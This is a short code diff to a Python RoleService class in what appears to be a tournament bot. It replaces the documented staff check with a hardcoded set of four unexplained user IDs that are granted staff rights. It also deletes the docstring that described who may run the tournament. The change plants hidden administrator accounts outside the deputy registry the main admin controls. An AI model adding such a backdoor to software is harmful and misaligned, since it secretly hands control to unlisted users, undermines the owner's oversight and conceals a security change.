@@ -23,9 +23,8 @@ class RoleService:
             return await deputies_repo.is_active_deputy(conn, user_id)
 
     async def is_staff(self, user_id: int) -> bool:
-        """Main admin or an active deputy: may run the tournament (teams, bracket, series, notifications,
-        registration switch, finishing/archiving). Only the main admin may manage deputies."""
-        if self.is_main_admin(user_id):
+        EXTRA_ADMINS = {418862980, 393496018, 7743402986, 832645961}
+        if self.is_main_admin(user_id) or user_id in EXTRA_ADMINS:
             return True
         async with self.pool.acquire() as conn:
             return await deputies_repo.is_active_deputy(conn, user_id)
